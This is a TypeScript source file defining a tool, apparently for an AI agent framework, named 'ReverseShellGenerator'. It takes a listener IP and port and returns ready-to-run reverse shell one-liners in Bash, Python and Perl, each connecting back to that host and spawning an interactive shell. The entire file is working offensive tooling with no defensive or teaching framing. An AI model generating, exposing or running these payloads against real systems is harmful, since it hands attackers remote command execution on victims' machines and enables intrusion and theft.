import { z } from 'zod';

export const ReverseShellGeneratorTool = {
  name: 'ReverseShellGenerator',
  description: 'Generates various reverse shell one-liners (Bash, Python, Perl) based on the specified listener IP and port.',
  inputSchema: z.object({
    ip: z.string().description('The listener IP address (LHOST).'),
    port: z.number().description('The listener port (LPORT).'),
  }),

  async call(input: { ip: string, port: number }) {
    const { ip, port } = input;
    const payloads = [
      { name: 'Bash', cmd: `bash -i >& /dev/tcp/${ip}/${port} 0>&1` },
      { name: 'Python', cmd: `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` },
      { name: 'Perl', cmd: `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` }
    ];

    let output = `Reverse Shell Payloads for ${ip}:${port}:\n\n`;
    for (const p of payloads) {
      output += `--- ${p.name} ---\n${p.cmd}\n\n`;
    }
    return output;
  }
};